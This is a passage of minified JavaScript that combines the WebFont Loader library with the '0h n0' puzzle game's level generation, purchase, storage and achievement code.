q(e,t,n,i,a,r,s,l){for(var u in this.V=e,this.ta=t,this.c=n,this.q=i,this.C=l||"BESbswy",this.k=a,this.F={},this.S=r||5e3,this.Z=s||o,this.B=this.A=o,O(e=new j(this.c,this.C)),R)R.hasOwnProperty(u)&&(W(e,new L(R[u],G(this.q))),this.F[R[u]]=e.s.offsetWidth);e.remove()}_.prototype.parse=function(){var e;if(-1!=this.a.indexOf("MSIE")){n=D(this);var t=$(i=A(this)),n=new x("MSIE",u=$(r=P(this.a,/MSIE ([\d\w\.]+)/,1)),r,"MSIE",u,r,n,t,i,M(this.H),new T("Windows"==n&&6<=u.e||"Windows Phone"==n&&8<=t.e,a,a))}else if(-1!=this.a.indexOf("Opera"))e:{n="Unknown";t=$(i=P(this.a,/Presto\/([\d\w\.]+)/,1));var i,r,s,l,u=$(r=A(this)),h=M(this.H);if(t.e!==o?n="Presto":(-1!=this.a.indexOf("Gecko")&&(n="Gecko"),t=$(i=P(this.a,/rv:([^\)]+)/,1))),-1!=this.a.indexOf("Opera Mini/"))n=new x("OperaMini",l=$(s=P(this.a,/Opera Mini\/([\d\.]+)/,1)),s,n,t,i,D(this),u,r,h,new T(a,a,a));else{if(-1!=this.a.indexOf("Version/")&&(l=$(s=P(this.a,/Version\/([\d\.]+)/,1))).e!==o){n=new x("Opera",l,s,n,t,i,D(this),u,r,h,new T(10<=l.e,a,a));break e}n=(l=$(s=P(this.a,/Opera[\/ ]([\d\.]+)/,1))).e!==o?new x("Opera",l,s,n,t,i,D(this),u,r,h,new T(10<=l.e,a,a)):new x("Opera",new C,"Unknown",n,t,i,D(this),u,r,h,new T(a,a,a))}}else n=/AppleWeb(K|k)it/.test(this.a)?(n=D(this),t=$(i=A(this)),u=$(r=P(this.a,/AppleWeb(?:K|k)it\/([\d\.\+]+)/,1)),h="Unknown",s=new C,l="Unknown",a,-1!=this.a.indexOf("Chrome")||-1!=this.a.indexOf("CrMo")||-1!=this.a.indexOf("CriOS")?h="Chrome":/Silk\/\d/.test(this.a)?h="Silk":"BlackBerry"==n||"Android"==n?h="BuiltinBrowser":-1!=this.a.indexOf("Safari")?h="Safari":-1!=this.a.indexOf("AdobeAIR")&&(h="AdobeAIR"),"BuiltinBrowser"==h?l="Unknown":"Silk"==h?l=P(this.a,/Silk\/([\d\._]+)/,1):"Chrome"==h?l=P(this.a,/(Chrome|CrMo|CriOS)\/([\d\.]+)/,2):-1!=this.a.indexOf("Version/")?l=P(this.a,/Version\/([\d\.\w]+)/,1):"AdobeAIR"==h&&(l=P(this.a,/AdobeAIR\/([\d\.]+)/,1)),s=$(l),e="AdobeAIR"==h?2<s.e||2==s.e&&5<=s.o:"BlackBerry"==n?10<=t.e:"Android"==n?2<t.e||2==t.e&&1<t.o:526<=u.e||525<=u.e&&13<=u.o,new x(h,s,l,"AppleWebKit",u,r,n,t,i,M(this.H),new T(e,u.e<536||536==u.e&&u.o<11,"iPhone"==n||"iPad"==n||"iPod"==n||"Macintosh"==n))):-1!=this.a.indexOf("Gecko")?(n="Unknown",i=new C,t="Unknown",u=$(r=A(this)),h=a,-1!=this.a.indexOf("Firefox")?(n="Firefox",h=3<=(i=$(t=P(this.a,/Firefox\/([\d\w\.]+)/,1))).e&&5<=i.o):-1!=this.a.indexOf("Mozilla")&&(n="Mozilla"),l=$(s=P(this.a,/rv:([^\)]+)/,1)),h=h||1<l.e||1==l.e&&9<l.o||1==l.e&&9==l.o&&2<=l.ba||s.match(/1\.9\.1b[123]/)!=o||s.match(/1\.9\.1\.[\d\.]+/)!=o,new x(n,i,t,"Gecko",l,s,D(this),u,r,M(this.H),new T(h,a,a))):z;return n},I.prototype.f=function(e){for(var t=[],n=0;n<arguments.length;n++)t.push(arguments[n].replace(/[\W_]+/g,"").toLowerCase());return t.join(this.va)},L.prototype.getName=r("J"),j.prototype.remove=function(){var e=this.s;e.parentNode&&e.parentNode.removeChild(e)};var R={Ea:"serif",Da:"sans-serif",Ca:"monospace"};function B(e,t,n){for(var o in R)if(R.hasOwnProperty(o)&&t===e.F[R[o]]&&n===e.F[R[o]])return i;return a}function H(e,t){e.A.remove(),e.B.remove(),t(e.q)}function F(e,t,n,i){this.c=t,this.t=n,this.N=0,this.ca=this.Y=a,this.S=i,this.k=e.k}function J(e,t,n,i,o){if(0===t.length&&o)E(e.t);else for(e.N+=t.length,o&&(e.Y=o),o=0;o<t.length;o++){var a=t[o],r=n[a.getName()],s=e.t,l=a;w(s.h,s.g.f(s.j,l.getName(),G(l).toString(),"loading")),V(s,"fontloading",l),new q(c(e.ha,e),c(e.ia,e),e.c,a,e.k,e.S,i,r).start()}}function K(e){0==--e.N&&e.Y&&(e.ca?(v((e=e.t).h,e.g.f(e.j,"loading")),v(e.h,e.g.f(e.j,"inactive")),w(e.h,e.g.f(e.j,"active")),V(e,"active")):E(e.t))}function Q(e,t,n){this.G=e,this.W=t,this.a=n,this.O=this.P=0}function Y(e,t){ee.W.$[e]=t}q.prototype.start=function(){this.A=new j(this.c,this.C),O(this.A),this.B=new j(this.c,this.C),O(this.B),this.ya=d(),W(this.A,new L(this.q.getName()+",serif",G(this.q))),W(this.B,new L(this.q.getName()+",sans-serif",G(this.q))),function e(t){var n=t.A.s.offsetWidth,i=t.B.s.offsetWidth;n===t.F.serif&&i===t.F["sans-serif"]||t.k.T&&B(t,n,i)?d()-t.ya>=t.S?t.k.T&&B(t,n,i)&&(t.Z===o||t.Z.hasOwnProperty(t.q.getName()))?H(t,t.V):H(t,t.ta):setTimeout(c((function(){e(this)}),t),25):H(t,t.V)}(this)},F.prototype.ha=function(e){var t=this.t;v(t.h,t.g.f(t.j,e.getName(),G(e).toString(),"loading")),v(t.h,t.g.f(t.j,e.getName(),G(e).toString(),"inactive")),w(t.h,t.g.f(t.j,e.getName(),G(e).toString(),"active")),V(t,"fontactive",e),this.ca=i,K(this)},F.prototype.ia=function(e){var t=this.t;v(t.h,t.g.f(t.j,e.getName(),G(e).toString(),"loading")),b(t.h,t.g.f(t.j,e.getName(),G(e).toString(),"active"))||w(t.h,t.g.f(t.j,e.getName(),G(e).toString(),"inactive")),V(t,"fontinactive",e),K(this)},Q.prototype.load=function(e){var t=e.context||this.G;if(this.c=new p(this.G,t),t=new U(this.c,t.document.documentElement,e),this.a.k.w){var n,i,o=this.W,a=this.c,r=[];for(n in e)!e.hasOwnProperty(n)||(i=o.$[n])&&r.push(i(e[n],a));for(e=e.timeout,this.O=this.P=r.length,e=new F(this.a,this.c,t,e),n=0,o=r.length;n<o;n++)(a=r[n]).v(this.a,c(this.ua,this,a,t,e))}else E(t)},Q.prototype.ua=function(e,t,n,i){var a=this;i?e.load((function(e,i,r){var s=0==--a.P;s&&N(t),setTimeout((function(){J(n,e,i||{},r||o,s)}),0)})):(e=0==--this.P,this.O--,e&&(0==this.O?E:N)(t),J(n,[],{},o,e))};var X=e,Z=new _(navigator.userAgent,t).parse(),ee=X.WebFont=new Q(e,new function(){this.$={}},Z);function te(e,t){this.c=e,this.d=t}function ne(e,t){this.c=e,this.d=t}ee.load=ee.load,te.prototype.load=function(e){for(var t=this.d.urls||[],n=this.d.families||[],i=0,o=t.length;i<o;i++)f(this.c,"head",m(this.c,t[i]));for(t=[],i=0,o=n.length;i<o;i++){var a=n[i].split(":");if(a[1])for(var r=a[1].split(","),s=0;s<r.length;s+=1)t.push(new L(a[0],r[s]));else t.push(new L(a[0]))}e(t)},te.prototype.v=function(e,t){return t(e.k.w)},Y("custom",(function(e,t){return new te(t,e)}));var ie={regular:"n4",bold:"n7",italic:"i4",bolditalic:"i7",r:"n4",b:"n7",i:"i4",bi:"i7"};function oe(e,t,n){this.a=e,this.c=t,this.d=n,this.m=[]}function ae(e,t){this.c=e,this.d=t,this.m=[]}function re(e,t,n){this.L=e||t+se,this.p=[],this.Q=[],this.da=n||""}ne.prototype.v=function(e,t){return t(e.k.w)},ne.prototype.load=function(e){f(this.c,"head",m(this.c,k(this.c)+"//webfonts.fontslive.com/css/"+this.d.key+".css"));for(var t=this.d.families,n=[],i=0,o=t.length;i<o;i++)n.push.apply(n,function(e){if(e=(n=e.split(":"))[0],n[1]){for(var t=n[1].split(","),n=[],i=0,o=t.length;i<o;i++){var a,r=t[i];r&&(a=ie[r],n.push(a||r))}for(t=[],i=0;i<n.length;i+=1)t.push(new L(e,n[i]));return t}return[new L(e)]}(t[i]));e(n)},Y("ascender",(function(e,t){return new ne(t,e)})),oe.prototype.v=function(e,t){var n,r,s,l=this,u=l.d.projectId,h=l.d.version;u?(n=l.c.u,(r=l.c.createElement("script")).id="__MonotypeAPIScript__"+u,s=a,r.onload=r.onreadystatechange=function(){if(!(s||this.readyState&&"loaded"!==this.readyState&&"complete"!==this.readyState)){if(s=i,n["__mti_fntLst"+u]){var a=n["__mti_fntLst"+u]();if(a)for(var h=0;h<a.length;h++)l.m.push(new L(a[h].fontfamily))}t(e.k.w),r.onload=r.onreadystatechange=o}},r.src=l.D(u,h),f(this.c,"head",r)):t(i)},oe.prototype.D=function(e,t){return k(this.c)+"//"+(this.d.api||"fast.fonts.com/jsapi").replace(/^.*http(s?):(\/\/)?/,"")+"/"+e+".js"+(t?"?v="+t:"")},oe.prototype.load=function(e){e(this.m)},Y("monotype",(function(e,n){return new oe(new _(navigator.userAgent,t).parse(),n,e)})),ae.prototype.D=function(e){var t=k(this.c);return(this.d.api||t+"//use.typekit.net")+"/"+e+".js"},ae.prototype.v=function(e,t){var n=this.d.id,o=this.d,a=this.c.u,r=this;n?(a.__webfonttypekitmodule__||(a.__webfonttypekitmodule__={}),a.__webfonttypekitmodule__[n]=function(n){n(e,o,(function(e,n,i){for(var o=0;o<n.length;o+=1){var a=i[n[o]];if(a)for(var s=0;s<a.length;s+=1)r.m.push(new L(n[o],a[s]));else r.m.push(new L(n[o]))}t(e)}))},n=g(this.c,this.D(n)),f(this.c,"head",n)):t(i)},ae.prototype.load=function(e){e(this.m)},Y("typekit",(function(e,t){return new ae(t,e)}));var se="//fonts.googleapis.com/css";function le(e){this.p=e,this.aa=[],this.I={}}re.prototype.f=function(){if(0==this.p.length)throw Error("No fonts to load !");if(-1!=this.L.indexOf("kit="))return this.L;for(var e=this.p.length,t=[],n=0;n<e;n++)t.push(this.p[n].replace(/ /g,"+"));return e=this.L+"?family="+t.join("%7C"),0<this.Q.length&&(e+="&subset="+this.Q.join(",")),0<this.da.length&&(e+="&text="+encodeURIComponent(this.da)),e};var ue={latin:"BESbswy",cyrillic:"&#1081;&#1103;&#1046;",greek:"&#945;&#946;&#931;",khmer:"&#x1780;&#x1781;&#x1782;",Hanuman:"&#x1780;&#x1781;&#x1782;"},he={thin:"1",extralight:"2","extra-light":"2",ultralight:"2","ultra-light":"2",light:"3",regular:"4",book:"4",medium:"5","semi-bold":"6",semibold:"6","demi-bold":"6",demibold:"6",bold:"7","extra-bold":"8",extrabold:"8","ultra-bold":"8",ultrabold:"8",black:"9",heavy:"9",l:"3",r:"4",b:"7"},ce={i:"i",italic:"i",n:"n",normal:"n"},de=RegExp("^(thin|(?:(?:extra|ultra)-?)?light|regular|book|medium|(?:(?:semi|demi|extra|ultra)-?)?bold|black|heavy|l|r|b|[1-9]00)?(n|i|normal|italic)?$");function pe(e,t,n){this.a=e,this.c=t,this.d=n}le.prototype.parse=function(){for(var e=this.p.length,t=0;t<e;t++){var i=this.p[t].split(":"),a=i[0].replace(/\+/g," "),r=["n4"];if(2<=i.length){var s,l,u=i[1],h=[];if(u)for(var c=(u=u.split(",")).length,d=0;d<c;d++)(l=(l=u[d]).match(/^[\w]+$/)?(l=de.exec(l.toLowerCase()),s=n,s=l==o?"":(s=n,s=(s=l[1])==o||""==s?"4":he[s]||(isNaN(s)?"4":s.substr(0,1)),[l[2]==o||""==l[2]?"n":ce[l[2]],s].join(""))):"")&&h.push(l);0<h.length&&(r=h),3==i.length&&(h=[],0<(i=(i=i[2])?i.split(","):h).length&&(i=ue[i[0]])&&(this.I[a]=i))}for(this.I[a]||(i=ue[a])&&(this.I[a]=i),i=0;i<r.length;i+=1)this.aa.push(new L(a,r[i]))}};var fe={Arimo:i,Cousine:i,Tinos:i};function me(e,t){this.c=e,this.d=t,this.m=[]}pe.prototype.v=function(e,t){t(e.k.w)},pe.prototype.load=function(e){var t,n,o=this.c;"MSIE"==this.a.getName()&&this.d.blocking!=i?(t=c(this.X,this,e),(n=function(){o.z.body?t():setTimeout(n,0)})()):this.X(e)},pe.prototype.X=function(e){for(var t=this.c,n=new re(this.d.api,k(t),this.d.text),i=this.d.families,o=i.length,a=0;a<o;a++){var r=i[a].split(":");3==r.length&&n.Q.push(r.pop());var s="";2==r.length&&""!=r[1]&&(s=":"),n.p.push(r.join(s))}(i=new le(i)).parse(),f(t,"head",m(t,n.f())),e(i.aa,i.I,fe)},Y("google",(function(e,n){return new pe(new _(navigator.userAgent,t).parse(),n,e)})),me.prototype.D=function(e){return k(this.c)+(this.d.api||"//f.fontdeck.com/s/css/js/")+(this.c.u.location.hostname||this.c.G.location.hostname)+"/"+e+".js"},me.prototype.v=function(e,t){var n=this.d.id,a=this.c.u,r=this;n?(a.__webfontfontdeckmodule__||(a.__webfontfontdeckmodule__={}),a.__webfontfontdeckmodule__[n]=function(e,n){for(var i,a,s,l,u=0,h=n.fonts.length;u<h;++u){var c=n.fonts[u];r.m.push(new L(c.name,(i="font-weight:"+c.weight+";font-style:"+c.style,l=s=a=void 0,a=4,s="n",l=o,i&&((l=i.match(/(normal|oblique|italic)/i))&&l[1]&&(s=l[1].substr(0,1).toLowerCase()),(l=i.match(/([1-9]00|normal|bold)/i))&&l[1]&&(/bold/i.test(l[1])?a=7:/[1-9]00/.test(l[1])&&(a=parseInt(l[1].substr(0,1),10)))),s+a)))}t(e)},n=g(this.c,this.D(n)),f(this.c,"head",n)):t(i)},me.prototype.load=function(e){e(this.m)},Y("fontdeck",(function(e,t){return new me(t,e)})),e.WebFontConfig&&ee.load(e.WebFontConfig)}(this,document);var Levels=new function(){var e={size4:[],size5:[],size6:[],size7:[],size8:[],size9:[]},t={4:60,5:60,6:60,7:60,8:60,9:60};function n(){Storage.setDataValue("puzzles",JSON.stringify(e))}function i(e){for(var t,n=null,i=0;i++<10;){n=new Grid(e),t={size:e,full:[],empty:[],quality:0,ms:0};var o=new Date;if(n.clear(),n.generate(e),n.maxify(e),Game.debug&&console.log("attempt",i,"valid",n.isValid(!0)),n.isValid(!0)){t.full=n.getValues(),n.breakDown(),t.empty=n.getValues(),t.ms=new Date-o,t.quality=n.quality;break}Game.debug&&console.warn("INVALID!",n),n=null}return Game.debug&&console.log("attempts, ",i),Game.debug&&console.log(t.ms,t),t}this.hasPuzzleAvailable=function(t){var n=e["size"+t];return!(!n||!n.length)},this.finishedSize=function(t){var i=e["size"+t];i&&i.length&&(i.shift(),n(),BackgroundService.kick())},this.addSize=function(t,i){var o=e["size"+t];if(!o)return!1;o.push(i),n(),BackgroundService.kick()},this.getSize=function(t,o){var a=e["size"+t];if(o||!a||!a.length)return i(t);var r=a[0];return 1<a.length&&(a.shift(),n(),BackgroundService.kick()),r},this.create=i,this.needs=function(){for(var n=1;n<=2;n++)for(var i in t){var o=e["size"+(i=+i)];if(o&&o.length<n)return i}return!1},this.init=function(){!function(){try{var t=JSON.parse(Storage.getDataValue("puzzles",JSON.stringify(e)));t.size5&&(e=t),e.size4||(e.size4=[],e.size9=[])}catch(t){}}(),BackgroundService.kick()},this.__defineGetter__("puzzles",(function(){return e}))},FixedLevels=new function(){var e={size4:[{size:4,full:[3,4,1,4,1,5,6,6,3,1,5,5,3,1,4,1],empty:[0,4,0,0,1,0,6,0,0,0,5,5,3,0,4,0],quality:56,ms:26},{size:4,full:[4,5,6,1,1,5,6,6,3,1,5,5,4,3,1,4],empty:[0,5,6,0,1,0,0,0,0,0,0,0,4,0,0,4],quality:69,ms:26}],size5:[{size:5,full:[5,4,1,5,3,7,6,5,7,1,4,1,1,4,1,1,4,4,1,1,6,7,7,6,6],empty:[5,0,0,0,3,0,0,5,0,1,0,0,0,4,0,0,4,0,0,1,0,7,7,6,0],quality:60,ms:26},{size:5,full:[4,3,1,4,5,3,1,4,5,6,1,4,1,1,4,6,7,5,5,1,4,5,1,1,1],empty:[0,3,0,0,5,3,0,0,5,0,0,4,0,0,4,0,7,0,0,0,4,0,1,1,0],quality:60,ms:16}],size6:[{size:6,full:[1,5,8,6,7,1,1,1,8,6,7,7,1,4,6,1,5,5,6,6,8,7,1,4,3,1,1,4,1,1,1,6,6,8,6,6],empty:[0,5,8,6,7,0,0,0,0,0,7,0,0,4,0,0,5,0,0,6,0,0,1,4,3,0,0,0,0,0,0,0,0,8,6,0],quality:64,ms:54},{size:6,full:[4,5,5,1,4,3,1,6,6,7,6,1,1,1,1,4,1,1,1,1,6,6,4,1,1,4,5,1,1,1,1,4,5,1,1,1],empty:[0,5,5,1,4,3,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,6,0,1,1,0,0,1,1,0,1,4,5,1,0,1],quality:53,ms:46}],size7:[{size:7,full:[3,5,1,4,4,1,4,1,7,6,6,6,1,4,6,6,5,1,1,7,5,4,1,1,4,4,8,1,6,4,6,1,1,6,1,1,1,7,6,5,9,1,5,5,7,6,1,6,1],empty:[0,5,1,0,4,0,0,0,7,0,6,6,1,4,0,0,5,0,1,0,0,0,0,1,4,0,0,0,6,0,0,0,0,6,0,1,0,0,6,0,9,1,5,0,0,0,0,0,1],quality:59,ms:234},{size:7,full:[4,1,1,1,7,7,5,6,5,4,1,7,7,5,5,4,1,7,7,7,1,1,1,7,9,9,9,6,5,7,6,8,1,1,1,1,4,1,8,6,6,6,4,6,4,1,5,5,5],empty:[0,1,1,0,0,7,0,0,5,0,0,7,7,5,5,0,0,7,0,0,0,0,1,0,0,0,9,0,5,7,0,0,0,0,0,0,0,0,0,6,0,0,0,0,4,0,0,5,5],quality:65,ms:155}],size8:[{size:8,full:[4,4,1,9,6,8,8,7,6,6,8,8,1,6,6,5,1,1,9,9,6,8,8,1,9,8,8,8,1,1,1,6,8,7,7,1,8,8,6,9,7,6,1,8,9,9,7,10,7,6,1,6,7,7,1,6,6,1,1,8,9,9,6,10],empty:[4,4,0,9,0,8,0,7,0,0,8,0,0,6,6,0,0,0,0,0,0,0,8,0,0,0,0,8,0,1,0,6,8,7,0,0,0,0,0,0,0,0,0,8,0,9,7,0,0,6,0,0,0,7,0,0,0,0,1,0,9,0,0,0],quality:67,ms:277},{size:8,full:[4,5,9,1,5,6,5,8,1,5,9,5,1,3,1,5,5,1,9,5,7,1,1,5,7,8,9,1,8,7,9,8,7,8,9,1,7,6,8,1,7,8,9,1,8,7,9,7,1,6,1,3,1,1,7,5,6,10,6,7,6,1,7,5],empty:[4,0,0,0,5,6,0,8,0,0,9,0,0,0,1,0,0,0,0,0,7,0,0,0,0,0,0,1,0,0,0,0,7,0,0,0,0,6,8,1,7,8,0,0,0,0,0,0,0,6,0,3,0,0,7,0,0,0,6,0,0,0,0,5],quality:70,ms:417}],size9:[{size:9,full:[1,10,7,10,7,8,8,1,4,3,6,1,5,1,6,6,9,7,1,8,9,8,8,1,1,7,5,8,10,11,10,10,11,1,6,1,3,1,6,1,9,10,10,10,10,1,6,7,1,9,10,10,10,10,7,8,9,7,1,7,7,1,6,5,6,1,4,1,9,9,6,9,8,9,6,8,6,1,8,5,8],empty:[0,0,0,0,0,8,0,0,0,3,0,0,5,0,0,0,0,7,1,0,0,8,0,0,1,0,0,8,10,11,0,0,0,1,0,1,0,0,0,0,0,10,0,0,0,1,0,7,0,9,10,0,10,10,0,0,0,0,0,0,7,0,6,0,6,0,0,1,0,0,6,0,8,0,0,8,0,0,0,0,0],quality:68,ms:733},{size:9,full:[10,7,7,8,7,9,1,6,6,5,1,1,3,1,7,9,8,8,5,1,1,1,8,8,10,9,9,6,7,1,5,5,1,8,7,7,1,6,1,7,7,6,9,1,1,6,9,5,7,1,6,9,6,8,4,7,1,1,1,1,1,4,6,1,11,8,8,8,8,8,1,5,1,1,9,9,9,9,9,8,11],empty:[10,7,7,8,0,0,0,6,6,0,0,0,0,0,0,9,8,0,5,0,0,0,0,8,0,0,0,6,7,0,5,0,1,0,0,7,0,0,0,0,7,0,0,0,0,6,0,5,0,0,6,0,0,0,0,0,0,0,0,0,1,4,0,0,0,8,0,8,0,0,1,0,0,0,9,0,0,0,0,8,11],quality:67,ms:578}]};this.has=function(t){var n="fixedLevelSize"+t;return alreadyServed=+Storage.getDataValue(n,0),pool=e["size"+t],!!(pool&&alreadyServed<pool.length)},this.get=function(t){var n="fixedLevelSize"+t;if(alreadyServed=+Storage.getDataValue(n,0),pool=e["size"+t],Game.debug&&console.log("retrieving fixed level "+t+", ",alreadyServed),pool&&alreadyServed<pool.length){var i=pool[alreadyServed];return Storage.setDataValue(n,alreadyServed+1),i}return null}},Store=new function(){var e=!1,t="0hn0_supporter",n=null;function i(){n.isActive&&(n.isTrial||Game.purchaseReceived())}function o(){(e=!0)&&(store.when(t).owned((function(e){Game.enableDonatedState()})),store.when(t).approved((function(e){e.finish(),Game.purchaseReceived()})),store.when(t).cancelled((function(e){})),store.when(t).error((function(e){})),window.MSApp&&i()),Game.fullVersion||a()}function a(n){var o,a;e&&(Game.fullVersion||(window.store&&((o=store.get(t))&&o.transaction&&o.transaction.id?n?Game.purchaseReceived():Game.enableDonatedState():n&&(a={action:"back",text:"<h1>"+lang("couldNotRestorePurchase")+"</h1>"},Game.showMessages(a))),window.MSApp&&i()))}this.init=function(){window.store&&(store.verbosity=store.DEBUG,store.register({id:t,alias:t,type:store.NON_CONSUMABLE}),store.ready(o),store.refresh()),window.MSApp&&(currentApp=Windows.ApplicationModel.Store.CurrentApp,n=currentApp.licenseInformation,e=!0,n.addEventListener("licensechanged",i))},this.buyFullVersion=function(){var n;e&&(window.MSApp||store.order(t),window.MSApp&&(!(n=currentApp.licenseInformation).isActive||n.isTrial?currentApp.requestAppPurchaseAsync(!1).done((function(){n.isActive&&!n.isTrial?(WinJS.log&&WinJS.log("You successfully upgraded your app to the fully-licensed version.","sample","status"),Game.purchaseReceived()):WinJS.log&&WinJS.log("You still have a trial license for this app.","sample","error")}),(function(){WinJS.log&&WinJS.log("The upgrade transaction failed. You still have a trial license for this app.","sample","error")})):(WinJS.log&&WinJS.log("You already bought this app and have a fully-licensed version.","sample","error"),Game.purchaseReceived())))},this.restorePurchases=a,this.__defineGetter__("enabled",(function(){return e}))},BackgroundService=new function(){var e=!!window.Worker,t=window.URL||window.webkitURL,n=!(!window.Blob||!t),i=null;function o(o){e&&(i||function(){var e,o;n?(Game.debug&&console.log("Web worker created on the fly"),e=[Utility,Grid,Tile,generateGridAndSolution,"var HintType = "+JSON.stringify(HintType)+";var TileType = {Unknown: 'Unknown',Dot: 'Dot',Wall: 'Wall',Value: 'Value'};var Directions = {Left: 'Left',Right: 'Right',Up: 'Up',Down: 'Down'};","\nvar Utils = new Utility();","\nfunction Hint() { this.active = false; }","self.onmessage = function(e) {generateGridAndSolution(e.data.size)};"].join(""),o=new Blob([e],{type:"text/javascript"}),i=new Worker(t.createObjectURL(o))):(i=new Worker("js/webworker.js"),Game.debug&&console.log("Web worker created statically")),i.onmessage=function(e){!function(e){Game.debug&&console.log("generated puzzle",e),Levels.addSize(e.size,e)}(JSON.parse(e.data))}}(),i.postMessage({size:o}))}Game.debug&&console.log("BackgroundService:",e),this.generatePuzzle=o,this.kick=function(){var e=Levels.needs();if(e){if(window.FixedLevels&&FixedLevels.has(e)){var t=FixedLevels.get(e);if(t)return void Levels.addSize(t.size,t)}o(e)}},this.__defineGetter__("enabled",(function(){return e}))},Storage=new function(){var e="0hn0_storage",t={q:42,size4played:0,size5played:0,size6played:0,size7played:0,size8played:0,size9played:0,gamesPlayed:0,bestTimeSize4:240,bestTimeSize5:300,bestTimeSize6:360,bestTimeSize7:420,bestTimeSize8:480,bestTimeSize9:540,gamesQuitted:0,autoSignIn:!0,showTimeTrial:!1,achievementsUnlocked:{},achievementsNotSent:{},theme:1,splashSkibbable:!1,donated:!1};function n(){o(e,JSON.stringify(t))}function i(e,t){var n;$.browser.chromeWebStore?chrome.storage.local.get(e,t):((n={})[e]=localStorage.getItem((Config.storagePrefix||"")+e),t(n))}function o(e,t,n){var i;$.browser.chromeWebStore?((i={})[e]=t,chrome.storage.local.set(i,n)):(localStorage.setItem((Config.storagePrefix||"")+e,t),n&&n())}$((function(){var o=JSON.parse(JSON.stringify(t));i(e,(function(i){var a,r;i&&i[e]&&(a=i[e],(r=JSON.parse(a))&&42==r.q&&(t=r,function(e){var i,o=!1;for(i in e)void 0===t[i]&&(t[i]=e[i],o=!0,Game.debug&&console.log("upgraded from template",i,e[i]));o&&n()}(o)))}))})),this.getItem=i,this.setItem=o,this.clear=function(e){$.browser.chromeWebStore?chrome.storage.local.clear(e):(localStorage.clear(),e&&e())},this.levelCompleted=function(e,i,o,a,r,s){if(Game.debug&&console.log("levelCompleted",e,i,o,a,r,s),Game.debug&&console.log("data",t),!(!e||e<4||9<e)&&o&&!isNaN(o))if(a)PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.apprentice);else if(!(e<4)){if(t.gamesPlayed++,0<i&&PlayCenter.submitScore(PlayCenter.IDS.Leaderboards.score,i),PlayCenter.submitScore(PlayCenter.IDS.Leaderboards.games_played,t.gamesPlayed),4==e&&(t.size4played++,PlayCenter.submitScore(PlayCenter.IDS.Leaderboards._4_x_4_played,t.size4played),r||PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.no_questions_asked_4_x_4),s||PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.forward_4_x_4)),5==e&&(t.size5played++,PlayCenter.submitScore(PlayCenter.IDS.Leaderboards._5_x_5_played,t.size5played),r||PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.no_questions_asked_5_x_5),s||PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.forward_5_x_5)),6==e&&(t.size6played++,PlayCenter.submitScore(PlayCenter.IDS.Leaderboards._6_x_6_played,t.size6played),r||PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.no_questions_asked_6_x_6),s||PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.forward_6_x_6)),7==e&&(t.size7played++,PlayCenter.submitScore(PlayCenter.IDS.Leaderboards._7_x_7_played,t.size7played),r||PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.no_questions_asked_7_x_7),s||PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.forward_7_x_7)),8==e&&(t.size8played++,PlayCenter.submitScore(PlayCenter.IDS.Leaderboards._8_x_8_played,t.size8played),r||PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.no_questions_asked_8_x_8),s||PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.forward_8_x_8)),9==e&&(t.size9played++,PlayCenter.submitScore(PlayCenter.IDS.Leaderboards._9_x_9_played,t.size9played),r||PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.no_questions_asked_9_x_9),s||PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.forward_9_x_9)),10==t.gamesPlayed&&PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.ten),42==t.gamesPlayed&&PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.q42),100==t.gamesPlayed&&PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.hundred),!(1e3<=t.gamesPlayed)||Storage.data.achievementsUnlocked&&Storage.data.achievementsUnlocked.thousand||PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.thousand),1==t["size"+e+"played"]){for(var l=!0,u=5;u<=8;u++)u!=e&&(1<=t["size"+u+"played"]||(l=!1));l&&PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.allfour)}10<=t["size"+e+"played"]&&(4==e&&PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements._160_dots),5==e&&PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements._250_dots),6==e&&PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements._360_dots),7==e&&PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements._490_dots),8==e&&PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements._640_dots),9==e&&PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements._810_dots));var h,c=1e3*o;0<o&&(PlayCenter.submitScore(PlayCenter.IDS.Leaderboards.best_time,c),4==e&&PlayCenter.submitScore(PlayCenter.IDS.Leaderboards.best_time_4_x_4,c),5==e&&PlayCenter.submitScore(PlayCenter.IDS.Leaderboards.best_time_5_x_5,c),6==e&&PlayCenter.submitScore(PlayCenter.IDS.Leaderboards.best_time_6_x_6,c),7==e&&PlayCenter.submitScore(PlayCenter.IDS.Leaderboards.best_time_7_x_7,c),8==e&&PlayCenter.submitScore(PlayCenter.IDS.Leaderboards.best_time_8_x_8,c),9==e&&PlayCenter.submitScore(PlayCenter.IDS.Leaderboards.best_time_9_x_9,c),h=t["bestTimeSize"+e],!isNaN(h)&&o<h&&1<=o&&(t["bestTimeSize"+e]=o)),n()}},this.gameQuitted=function(){t.gamesQuitted++,n(),10==t.gamesQuitted&&PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.quitter)},this.setDataValue=function(e,i){t[e]=i,n()},this.getDataValue=function(e,n){return void 0===t[e]?null!=n&&n:t[e]},this.achievementUnlocked=function(e){t.achievementsUnlocked[e]||(Game.debug&&console.log("achievement unlocked: "+e),t.achievementsUnlocked[e]=!0,t.achievementsNotSent[e]=!0,n())},this.achievementSent=function(e){t.achievementsUnlocked[e]&&t.achievementsNotSent[e]&&(delete t.achievementsNotSent[e],n())},this.__defineGetter__("data",(function(){return t}))},PlayCenter=new 